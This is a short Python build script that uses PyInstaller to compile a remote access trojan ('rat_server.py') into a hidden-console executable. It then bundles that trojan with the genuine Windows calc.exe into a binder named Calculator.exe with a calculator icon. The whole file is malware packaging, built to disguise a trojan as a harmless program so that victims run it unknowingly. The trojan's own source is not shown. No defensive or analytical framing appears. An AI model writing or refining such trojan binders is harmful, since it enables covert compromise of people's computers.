import os
import sys
import shutil
from PyInstaller.__main__ import run

def build_rat():
    """Compile RAT server to EXE"""
    run([
        'rat_server.py',
        '--onefile',
        '--noconsole',
        '--name=rat_server.exe',
        '--distpath=./dist'
    ])

def build_binder():
    """Compile binder with embedded RAT"""
    run([
        'binder.py',
        '--onefile',
        '--noconsole',
        '--name=Calculator.exe',
        '--icon=calculator.ico',
        '--add-data=dist/rat_server.exe;.',
        '--add-data=C:/Windows/System32/calc.exe;.'
    ])

if __name__ == "__main__":
    build_rat()
    build_binder()
    shutil.rmtree('build')  # Clean PyInstaller temp files